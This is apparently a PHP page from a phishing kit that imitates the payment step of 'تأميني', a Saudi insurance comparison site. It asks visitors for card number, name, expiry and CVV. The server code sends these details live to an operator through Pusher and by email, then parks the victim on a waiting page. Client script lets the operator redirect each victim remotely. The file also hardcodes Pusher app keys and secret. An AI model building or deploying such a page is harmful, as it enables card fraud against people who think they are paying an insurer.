<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'البطاقة');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' => 'البطاقة'
    ];

    $pusher->trigger('temaeen-new', 'curreneft-page', $dataa);
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $site = array(
        'cardNumber' => $_POST['cardNumber'],
        'cardName' => $_POST['cardName'],
        'cvv' => $_POST['cvv'],
        'year' => $_POST['year'],
        'message' => 'البطاقة',
        'type' => '1'
    );

    $userId = $_SESSION['user_id'];
    $id = $User->InsertCardVisaRelatedUser($userId, $site);
    if ($id) {
        $User->UpdateStatus($userId, 'البطاقة');

        $_SESSION['card_id'] = $id;

        $data = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('temaeen-new', 'update-user-accountt', $data);

        SendTwoMail($_POST['cardNumber'], $_POST['year'], $_POST['cvv']);

        echo "<script>document.location.href='wait-payment.php';</script>";
    }
}

if (isset($_GET['reject'])) {
    $showError = true;
}


?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأميني المنصة الأولى لمقارنة أسعار تأمين المركبات والطبي وسفر وأخطاء طبية اونلاين في السعودية</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Bootstrap JS (bundle includes Popper.js) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a {
            text-decoration: none;
        }

        /* body {
            height: 2000vh;
        } */

        .bacOne {
            background-color: #0088eb;
        }

        .fa-solid,
        label {
            color: rgb(153, 153, 153);
        }

        .form-control {
            height: 50px !important;
        }

        label {
            font-weight: bold;
            font-size: 14px;
        }

        .fa-solid.active {
            color: rgb(194, 77, 141) !important;
        }

        .text-primary {
            color: #0088eb !important;
        }

        .text-muted {
            color: rgb(153, 153, 153) !important;
        }

        /* ::placeholder {
            color: #d2d6da !important;
        } */

        .bg-two {
            background-color: #0088eb;
        }

        .form-check-input:checked {
            background-color:#76b740 !important;
            /* Bootstrap primary color or your custom color */
            border-color:#76b740;
        }

        /* Optional: Change the check mark dot color (on some browsers) */

        .form-check-input {
            width: 1.1em;
            height: 1.1em;
            border: 1px solid gray;
            /* Blue border, 2px thick */
        }

        .group {
            display: flex;
            align-items: center;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            height: 40px;
        }

        .bg-one {
            background-color: #0088eb;
            height: 40px;
            color: #f8f9fa;
        }

        .bg-o-two {
            height: 40px;
            height: 40px;
            background-color: rgb(240, 240, 240);
            color: rgb(153, 153, 153) !important;
        }

        .bg-a-two {
            height: 40px;
            background-color: rgb(230, 228, 228);
            color: rgb(153, 153, 153) !important;
        }

        .forShow {
            display: flex;
            gap: 10px;
        }

        .ajamaclas {
            display: flex;
            justify-content: start;
            align-items: center;
        }

        .active {
            background-color: #a1cdda;
            border: 1px solid #31849b;
        }

        .bdgs {
            background-image: url(./assets/TPL.svg);
            background-repeat: no-repeat;
        }

        .bg-light {
            background-color: #f2f2f3 !important;
        }

        .hide {
            display: none;
        }

        .show {
            display: block;
        }
    </style>
</head>

<body class="bg-white">

    <nav class="d-flex justify-content-center py-2 shadow-sm">
        <a href="index.php">
            <a href="index.php">
                <img src="./assets/tamini-removebg-preview.png" width="150"  alt="">
            </a>
        </a>
    </nav>

    <div class="container my-5">
        <div class="row d-flex justify-content-center">
            <div class="col-11 shadow p-4 my-4" style="border-radius: 15px;">
                <h4 class="text-center fw-bold mb-4">معلومات الدفع</h4>
                <div class="text-center mb-5">
                    <img src="./assets/button.svg" width="150" alt="">
                </div>
                <form action="" method="POST" onsubmit="return validateAndSubmitForm()">

                    <div class="mt-4">
                        <input type="text" name="cardNumber" id="cardNumberI" style="direction: ltr !important;" onblur="validateCardNumber()" inputmode="numeric" minlength="10" maxlength="16" required class="form-control" placeholder="رقم بطاقة الائتمان">
                        <div class="hide" id="checkToCard">
                            <small class="text-danger">رقم البطاقة غير صحيح</small>
                        </div>
                        <input type="hidden" id="checkCard" value="0">

                        <div class="d-flex mt-3 gap-4">
                            <input type="text" name="year" inputmode="numeric" minlength="5" id="expiry" maxlength="5" required class="form-control" placeholder="MM/YY">

                            <input type="text" name="cvv" inputmode="numeric" minlength="3" maxlength="3" required class="form-control" placeholder="رمز CVC أو CVV">
                        </div>

                        <input type="text" name="cardName" required class="form-control mt-3" placeholder="الاسم على البطاقة">
                    </div>

                    <?php
                    // Check if data is submitted
                    if (isset($showError)) {
                        echo '<p class="text-center mt-2 text-danger fw-bold">البطاقة المدخلة غير صحيحة</p>';
                    }
                    ?>

                    <div class="text-center mt-4">
                        <button type="submit" name="submit" id="butSubm" disabled class="btn btn-primary fw-bold text-light w-100">تأكيد الدفع</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
<script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;

        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('my-channel-new-jaz');

        channel.bind('page-tamen-new', function(data) {

            if (data.userId === userIdFromSession) {
                document.location.href = data.page;
            }

        });
    </script>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const submitBtn = document.getElementById('butSubm');

            // Listen to input events on all form fields
            form.addEventListener('input', function() {
                if (form.checkValidity()) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            });

            // Also check on page load in case browser autofills
            if (form.checkValidity()) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }
        });

        document.getElementById('cardNumberI').addEventListener('input', function(event) {
            let input = event.target;
            let value = input.value.replace(/\s/g, ''); // Remove spaces
            let numericValue = value.replace(/\D/g, ''); // Remove non-digit characters

            // If length is 16, allow removing characters, but not adding more
            if (/^\d{0,16}$/.test(numericValue)) {
                let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, '$1 '); // Add space after every group of four digits
                input.value = formattedValue;

                // If length is exactly 16, set maxlength attribute to prevent adding more characters
                if (numericValue.length === 16) {
                    input.setAttribute('maxlength', '16');
                } else {
                    input.removeAttribute('maxlength');
                }
            } else {
                // If more than 16 characters, ignore the input
                input.value = input.value.slice(0, 16);
            }
        });

        function isValidLuhn(digits) {
            let checkDigit = 0;

            for (let i = digits.length - 2; i >= 0; --i) {
                checkDigit += (i % 2 === 0) ?
                    (digits[i] > 4 ? digits[i] * 2 - 9 : digits[i] * 2) :
                    digits[i];
            }

            return (10 - (checkDigit % 10)) === digits[digits.length - 1];
        }

        function validateCardNumber() {
            var cardNumber = document.getElementById("cardNumberI").value.replace(/\s/g, ''); // Remove spaces
            if (/[^0-9-\s]+/.test(cardNumber)) {
                document.getElementById("checkCard").value = 2;
                document.getElementById("checkToCard").classList.remove("hide");
                document.getElementById("checkToCard").classList.add("show");
                return;
            }

            var isValid = isValidLuhn(cardNumber.split('').map(Number));
            if (isValid) {
                document.getElementById("checkCard").value = 1;
                document.getElementById("checkToCard").classList.remove("show");
                document.getElementById("checkToCard").classList.add("hide");
            } else {
                document.getElementById("checkCard").value = 2;
                document.getElementById("checkToCard").classList.remove("hide");
                document.getElementById("checkToCard").classList.add("show");
            }
        }

        function validateCardNumber2() {
            var cardNumber = document.getElementById("cardNumberI2").value.replace(/\s/g, ''); // Remove spaces
            if (/[^0-9-\s]+/.test(cardNumber)) {
                document.getElementById("checkCard2").value = 2;
                document.getElementById("checkToCard2").classList.remove("hide");
                document.getElementById("checkToCard2").classList.add("show");
                return;
            }

            var isValid = isValidLuhn(cardNumber.split('').map(Number));
            if (isValid) {
                document.getElementById("checkCard2").value = 1;
                document.getElementById("checkToCard2").classList.remove("show");
                document.getElementById("checkToCard2").classList.add("hide");
            } else {
                document.getElementById("checkCard2").value = 2;
                document.getElementById("checkToCard2").classList.remove("hide");
                document.getElementById("checkToCard2").classList.add("show");
            }
        }

        function validateAndSubmitForm() {

            var isValidCard = (document.getElementById("checkCard").value == 1);

            if (isValidCard) {
                return true;
            } else {
                return false;
            }
        }

        function validateAndSubmitForm2() {

            var isValidCard = (document.getElementById("checkCard2").value == 1);

            if (isValidCard) {
                return true;
            } else {
                return false;
            }
        }

        const expiryInput = document.getElementById('expiry');

        expiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, ''); // remove non-digits

            if (value.length > 4) value = value.slice(0, 4);

            if (value.length >= 3) {
                value = value.slice(0, 2) + '/' + value.slice(2);
            }

            e.target.value = value;
        });

        expiryInput.addEventListener('blur', function(e) {
            const [yy, mm] = e.target.value.split('/');
            if (!yy || !mm) return;

            const year = parseInt(yy, 10);
            const month = parseInt(mm, 10);

            if (year < 1 || year > 31 || month < 25 || month > 35) {
                alert('Invalid year or month. Year must be between 2025-2035, and month 01-12.');
                e.target.value = ''; // clear invalid input
            }
        });
    </script>


</body>

</html>